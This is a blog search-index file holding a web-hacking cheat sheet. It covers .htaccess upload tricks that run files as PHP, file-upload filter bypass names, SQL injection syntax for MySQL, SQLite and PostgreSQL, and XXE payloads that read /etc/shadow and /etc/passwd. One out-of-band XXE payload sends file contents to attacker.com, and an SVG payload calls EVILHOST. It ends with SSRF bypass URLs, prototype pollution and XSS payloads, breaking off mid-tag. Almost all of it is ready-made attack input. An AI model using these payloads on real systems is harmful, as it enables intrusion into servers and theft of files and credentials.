<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Web Note (Update 2021.07.14)</title>
      <link href="2021/07/14/2021-01-15-note/"/>
      <url>2021/07/14/2021-01-15-note/</url>
      
        <content type="html"><![CDATA[<h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess<br></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag engine off</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .pocas</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line">php_value auto_append_file .htaccess</span><br><span class="line">#+ADw?php phpinfo()+ADs</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#define test_width 1337</span><br><span class="line">#define test_height 1337</span><br><span class="line">AddType application&#x2F;x-httpd-php .pocas</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line"></span><br><span class="line">AddType application&#x2F;x-httpd-php .pocas</span><br><span class="line">php_value zend.multibyte 1</span><br><span class="line">php_value zend.detect_unicode 1</span><br><span class="line">php_value display_errors 1</span><br></pre></td></tr></table></figure><hr><h2 id="Upload-Function"><a href="#Upload-Function" class="headerlink" title="Upload Function"></a>Upload Function<br></h2><p><span style="color:#21C587">&#35;</span><strong> Blacklisting Bypass</strong><br></p><ul><li>PHP → <code>.php</code>, <code>.phtm</code>, <code>phtml</code>, <code>.phps</code>, <code>.pht</code>, <code>.php2</code>, <code>.php3</code>, <code>.php4</code>, <code>.php5</code>, <code>.shtml</code>, <code>.pahr</code>, <code>.pgif</code>, <code>.inc</code><br></li><li>ASP → <code>.asp</code>, <code>.aspx</code>, <code>.cer</code>, <code>.asa</code><br></li><li>JSP → <code>.jsp</code>, <code>.jspx</code>, <code>.jsw</code>, <code>.jsv</code>, <code>jspf</code><br></li></ul><p><span style="color:#21C587">&#35;</span><strong> Whitelisting Bypass</strong><br></p><ul><li>file.jpg.php</li><li>file.php.jpg</li><li>file.php.blah123jpg</li><li>file.php%00.jpt</li><li>file.php\x00.jpt</li><li>file.php%00</li><li>file.php%20</li><li>file.php%0d%0a.jpg</li><li>file.php/</li><li>file.php.\</li></ul><hr><h2 id="File-Upload-WAF-Bypass"><a href="#File-Upload-WAF-Bypass" class="headerlink" title="File Upload WAF Bypass"></a>File Upload WAF Bypass</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?file&#x3D;rce.php &lt;– Blocked</span><br><span class="line">&#x2F;?file&#x3D;rce.php.jpg &lt;– Blocked</span><br><span class="line">&#x2F;?file&#x3D;rce.php5 &lt;– Blocked</span><br><span class="line">&#x2F;?file&#x3D;&#x3D;&#x3D;rce.php &lt;– Bypassed 200 OK</span><br></pre></td></tr></table></figure><hr><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title=" SQL Injection"></a><span style="color:#21C587"></span> SQL Injection<br></h2><p><span style="color:#21C587">&#35;</span><strong> MySQL</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">- comments</span><br><span class="line">#</span><br><span class="line">--</span><br><span class="line">&#x2F;**&#x2F;</span><br><span class="line"></span><br><span class="line">- like</span><br><span class="line">1&#x3D;1, 1 in(1), 1 like 1, !(1&lt;&gt;1)</span><br><span class="line"></span><br><span class="line">- count func</span><br><span class="line">count()</span><br><span class="line"></span><br><span class="line">- version check</span><br><span class="line">@@version</span><br><span class="line">version()</span><br><span class="line">@@innodb_version;</span><br><span class="line"></span><br><span class="line">- string split</span><br><span class="line">mid()</span><br><span class="line">right(left())</span><br><span class="line">substr()</span><br><span class="line">substring()</span><br><span class="line"></span><br><span class="line">- sleep func</span><br><span class="line">sleep(5), benchmark(40000000,md5(1));</span><br><span class="line"></span><br><span class="line">- string to hex</span><br><span class="line">ascii()</span><br><span class="line">ord()</span><br><span class="line"></span><br><span class="line">- add string</span><br><span class="line">concat()</span><br><span class="line">group_concat()</span><br><span class="line"></span><br><span class="line">- string to hex</span><br><span class="line">&#39;admin&#39; &#x3D; 0x61646d696e</span><br><span class="line"></span><br><span class="line">- whitespace bypass</span><br><span class="line">%0a, %a0, %20, %09, %0d, %0c, %b, &#x2F;**&#x2F;, ()</span><br><span class="line"></span><br><span class="line">- Conditional</span><br><span class="line">if(1&#x3D;1, 1, 0), case when 1&#x3D;1 then 1 else 0 end;</span><br><span class="line"></span><br><span class="line">- length func</span><br><span class="line">length(), char_length(), character_length()</span><br><span class="line"></span><br><span class="line">- Number of columns</span><br><span class="line">&#39; order by 1 --</span><br><span class="line">&#39; order by 2 --</span><br><span class="line">&#39; order by 3 --</span><br><span class="line">&#39; union null --</span><br><span class="line">&#39; union null, null --</span><br><span class="line">&#39; union null, null, null --</span><br><span class="line"></span><br><span class="line">- etc</span><br><span class="line">select load_file(&#39;&#x2F;etc&#x2F;passwd&#39;)</span><br><span class="line">select database_name, table_name from mysql.innodb_table_stats</span><br><span class="line">select table_schema from information_schema.schemas</span><br><span class="line">select table_name from information_schema.tables</span><br><span class="line">select column_name from information_schema.columns</span><br><span class="line">select extractvalue(rand(),concat(0x3a,((select &lt;column_name&gt; from &lt;table_name&gt; limit 0, 1))))</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> SQLite</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">- comments</span><br><span class="line">--, &#x2F;**&#x2F;</span><br><span class="line"></span><br><span class="line">- length check</span><br><span class="line">length()</span><br><span class="line"></span><br><span class="line">- like</span><br><span class="line">1&#x3D;1, 1 in(1), 1 like 1, 1&#x3D;&#x3D;1, !(1&lt;&gt;1)</span><br><span class="line"></span><br><span class="line">- version check</span><br><span class="line">sqlite_version()</span><br><span class="line"></span><br><span class="line">- string split</span><br><span class="line">substr()</span><br><span class="line"></span><br><span class="line">- add string</span><br><span class="line">||, concat()</span><br><span class="line"></span><br><span class="line">- sleep func</span><br><span class="line">sqlite3_sleep()</span><br><span class="line"></span><br><span class="line">- Conditional</span><br><span class="line">case when 1&#x3D;1 then 1 else 0 end</span><br><span class="line"></span><br><span class="line">- limit</span><br><span class="line">limit &lt;count&gt;</span><br><span class="line">limit &lt;skip&gt;, &lt;count&gt;</span><br><span class="line">limit &lt;count&gt; offset &lt;skip&gt;</span><br><span class="line"></span><br><span class="line">- Number of columns</span><br><span class="line">&#39; order by 1 --</span><br><span class="line">&#39; order by 2 --</span><br><span class="line">&#39; order by 3 --</span><br><span class="line">&#39; union null --</span><br><span class="line">&#39; union null, null --</span><br><span class="line">&#39; union null, null, null --</span><br><span class="line"></span><br><span class="line">- string to hex</span><br><span class="line">unicode()</span><br><span class="line"></span><br><span class="line">- select bypass</span><br><span class="line">select 1 &#x3D; values(1)</span><br><span class="line">select &#39;admin&#39; &#x3D; values(&#39;admin&#39;)</span><br><span class="line"></span><br><span class="line">- command injection</span><br><span class="line">.sh ls, .shell ls, .system ls</span><br><span class="line"></span><br><span class="line">- etc</span><br><span class="line">select group_concat(sql), group_concat(name) from sqlite_master</span><br><span class="line">union select group_concat(&lt;column_name&gt;), group_concat(&lt;column_name&gt;), null, null from &lt;table_name&gt;</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> PgSQL</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">- coments</span><br><span class="line">--, &#x2F;**&#x2F;</span><br><span class="line"></span><br><span class="line">- length check</span><br><span class="line">length()</span><br><span class="line"></span><br><span class="line">- version check</span><br><span class="line">version()</span><br><span class="line"></span><br><span class="line">- like</span><br><span class="line">&#x3D;, in()</span><br><span class="line"></span><br><span class="line">- string to hex</span><br><span class="line">ascii()</span><br><span class="line"></span><br><span class="line">- sleep func</span><br><span class="line">pg_sleep()</span><br><span class="line"></span><br><span class="line">- add string</span><br><span class="line">||, concat(), string_agg()</span><br><span class="line"></span><br><span class="line">- Number of columns</span><br><span class="line">&#39; order by 1 --</span><br><span class="line">&#39; order by 2 --</span><br><span class="line">&#39; order by 3 --</span><br><span class="line">&#39; union null --</span><br><span class="line">&#39; union null, null --</span><br><span class="line">&#39; union null, null, null --</span><br><span class="line"></span><br><span class="line">- limit</span><br><span class="line">limit &lt;count&gt;</span><br><span class="line">limit &lt;count&gt; offset &lt;skip&gt;</span><br><span class="line"></span><br><span class="line">- etc</span><br><span class="line">select current_database()</span><br><span class="line">select string_agg(table_name, &#39;,&#39;) from information_schema.tables</span><br><span class="line">string_agg(column_name, &#39;,&#39;), null, null, null from information_schema.columns where table_name &#x3D; &lt;table_name&gt;</span><br><span class="line">select string_agg(&lt;column_name&gt;), null, null, null from &lt;table_name&gt;</span><br></pre></td></tr></table></figure><hr><h2 id="XXE-Original"><a href="#XXE-Original" class="headerlink" title="XXE (Original)"></a>XXE (Original)<br></h2><p><span style="color:#21C587">&#35;</span><strong> XXE Original</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">burp</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">burp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/shadow&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lfi</span>&gt;</span><span class="symbol">&amp;burp;</span><span class="tag">&lt;/<span class="name">lfi</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE to SSRF</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">burp</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">burp</span> <span class="meta-keyword">system</span> <span class="meta-string">&quot;domain&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ssrf</span>&gt;</span><span class="symbol">&amp;burp;</span><span class="tag">&lt;/<span class="name">ssrf</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE (XInclude attacks)</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">burp</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span> <span class="attr">href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">burp</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE (php wrapper)</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">burp</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">burp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=****&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lfi</span>&gt;</span><span class="symbol">&amp;burp;</span><span class="tag">&lt;/<span class="name">lfi</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> OOB XXE</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://ip/poc.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%xxe;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// http://ip/poc.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://attacker.com/?collect=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><hr><h2 id="XXE-feat-svg"><a href="#XXE-feat-svg" class="headerlink" title="XXE (feat svg)"></a>XXE (feat svg)<br></h2><p><span style="color:#21C587">&#35;</span><strong> XXE</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/issue&quot;</span> &gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">font-size</span>=<span class="string">&quot;40&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;15&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span>                    </span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Blind XXE &amp; SSRF</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no”?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ENTY</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">XXE</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/issue”&gt; ]&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;svg xmlns:svg=”http://www.w3.org/2000/svg&quot;</span> <span class="meta-keyword">xmlns</span>=”http://www.w3.org/2000/svg<span class="meta-string">&quot; xmlns:xlink=&quot;</span>http://www.w3.org/1999/xlink<span class="meta-string">&quot; width=&quot;</span>200<span class="meta-string">&quot; height=”200&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">&lt;image xlink:href=&quot;http://EVILHOST:1337/SSRF?&amp;XXE;&quot; /&gt;</span></span><br><span class="line"><span class="meta">&lt;/svg&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE &amp; XSS</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.1&quot; standlone=&quot;no&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">svg</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//W3C//DTD SVG 1.1//EN&quot;</span> <span class="meta-string">&quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">baseProfile</span>=<span class="string">&quot;full&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">rect</span> <span class="attr">style</span>=<span class="string">&quot;fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    alert(<span class="string">&quot;XXE &amp; XSS&quot;</span>);</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE &amp; Open Redirect</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">code</span>&gt;</span></span><br><span class="line">  <span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;window.location=&#x27;URL&#x27;&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.rog/200/svg&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rect</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">style</span>=<span class="string">&quot;fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">code</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="SSRF-Payload"><a href="#SSRF-Payload" class="headerlink" title="SSRF Payload"></a>SSRF Payload<br></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;127.0.0.1&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;localhost&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;0.0.0.0</span><br><span class="line">http:&#x2F;&#x2F;[::]:80</span><br><span class="line">http:&#x2F;&#x2F;0000::1:80&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;0177.0.0.1&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;2130706433&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;127.1.1.1:80\@127.2.2.2:80&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;127.1.1.1:80\@@127.2.2.2:80&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;127.1.1.1:80:\@@127.2.2.2:80&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;127.1.1.1:80#\@127.2.2.2:80&#x2F;</span><br><span class="line">HTtP:&#x2F;\ˡℴcalhost</span><br></pre></td></tr></table></figure><hr><h2 id="Prototype-Pollution"><a href="#Prototype-Pollution" class="headerlink" title="Prototype Pollution"></a>Prototype Pollution</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const obj &#x3D; &#123;&#125;</span><br><span class="line">obj.__proto__ &#x3D;&#x3D; obj.constructor.prototype # true</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jsonpatch = <span class="built_in">require</span>(<span class="string">&#x27;fast-json-patch&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> a = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> payload = [&#123;<span class="attr">op</span>:<span class="string">&#x27;replace&#x27;</span>, <span class="attr">path</span>:<span class="string">&#x27;/constructor/prototype/polluted&#x27;</span>, <span class="attr">value</span>:<span class="string">&#x27;Prototype Pollution&#x27;</span>&#125;];</span><br><span class="line">jsonpatch.applyPatch(a, payload);</span><br><span class="line"></span><br><span class="line">console.log(a.polluted) # Prototype Pollution</span><br></pre></td></tr></table></figure><p><a href="https://github.com/BlackFan/client-side-prototype-pollution">Cheat Sheet</a></p><hr><h2 id="XSS-Payload"><a href="#XSS-Payload" class="headerlink" title="XSS Payload"></a>XSS Payload<br></h2><p><span style="color:#21C587">&#35;</span><strong> Reflection XSS statement</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">script tag</span><br><span class="line"><span class="tag">&lt;<span 